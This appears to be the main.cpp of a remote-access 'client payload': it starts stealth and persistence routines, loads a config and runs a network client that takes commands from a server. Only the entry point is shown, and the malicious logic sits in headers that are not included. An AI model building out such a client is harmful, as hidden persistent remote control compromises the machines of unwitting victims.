// main.cpp - Entry point for the client payload
// Initializes core modules and starts the main network loop

#include "../include/NetworkClient.h"
#include "../include/Stealth.h"
#include "../include/Config.h"
#include <iostream>

int main() {
    // Initialize stealth and persistence mechanisms
    Stealth::initialize();

    // Load configuration
    Config::load();

    // Start network client (connect to server and handle commands)
    NetworkClient client;
    client.run();

    return 0;
} 